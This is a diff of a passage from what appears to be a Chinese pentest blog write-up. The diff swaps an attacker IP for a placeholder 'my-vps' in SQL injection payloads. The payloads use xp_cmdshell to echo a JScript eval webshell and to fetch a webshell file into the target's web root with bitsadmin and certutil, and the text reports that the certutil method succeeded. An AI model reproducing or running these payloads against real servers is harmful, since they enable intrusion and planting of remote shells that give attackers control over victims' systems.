@@ -138,12 +138,12 @@ uname=test';exec master..xp_cmdshell 'echo ^<%@ Page Language="Jscript"%^>^<%eva
 
 使用bitsadmin下载时并没有成功，访问```http://111.*.*.59/Content/layer/aaa.aspx```返回404
 ```sql
-uname=test';exec master..xp_cmdshell 'bitsadmin /rawreturn /transfer getfile http://59.108.123.123/aaa.aspx D:\bak\20170226\webapp\Content\layer\aaa.aspx';--
+uname=test';exec master..xp_cmdshell 'bitsadmin /rawreturn /transfer getfile http://my-vps/aaa.aspx D:\bak\20170226\webapp\Content\layer\aaa.aspx';--
 ```
 
 使用certutil下载时才成功，得到shell地址```http://111.*.*.59/Content/layer/aaa.aspx```
 ```sql
-uname=test';exec master..xp_cmdshell 'certutil -urlcache -split -f http://59.108.123.123/aaa.aspx D:\bak\20170226\webapp\Content\layer\aaa.aspx';--
+uname=test';exec master..xp_cmdshell 'certutil -urlcache -split -f http://my-vps/aaa.aspx D:\bak\20170226\webapp\Content\layer\aaa.aspx';--
 ```
 ![70](/img/post/Xnip2019-03-03_20-42-24.png)
 
